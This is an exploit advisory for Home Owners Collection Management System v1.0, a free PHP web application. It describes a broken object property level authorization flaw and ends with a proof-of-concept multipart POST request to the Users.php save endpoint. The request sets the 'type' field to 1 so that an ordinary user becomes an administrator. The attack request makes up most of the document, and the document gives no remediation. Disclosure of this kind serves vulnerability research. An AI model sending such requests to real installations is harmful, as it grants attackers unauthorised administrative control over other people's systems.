# Exploit Title: Home-owners-collection-management-system v1.0 - Broken Object Property Level Authorization(BOPLA)
## Date: 2/1/2024
## Vendor Homepage: https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html
## Tested on: Debian Linux, Apache, Mysql
## Vendor: oretnom23
## Version: v1.0
## Exploit Description:
## Home-owners-collection-management-system v1.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attackers to change his access type to admin(vertical privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
POST /hocms/classes/Users.php?f=save HTTP/1.1
...
------WebKitFormBoundaryG59oQyjTJHQHKCEp
Content-Disposition: form-data; name="id"

10
------WebKitFormBoundaryG59oQyjTJHQHKCEp
Content-Disposition: form-data; name="firstname"

user1
------WebKitFormBoundaryG59oQyjTJHQHKCEp
Content-Disposition: form-data; name="lastname"

hh
------WebKitFormBoundaryG59oQyjTJHQHKCEp
Content-Disposition: form-data; name="username"

user1
------WebKitFormBoundaryG59oQyjTJHQHKCEp
Content-Disposition: form-data; name="password"


------WebKitFormBoundaryG59oQyjTJHQHKCEp
Content-Disposition: form-data; name="type"

1(CHANGE HERE)
------WebKitFormBoundaryG59oQyjTJHQHKCEp
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryG59oQyjTJHQHKCEp--
```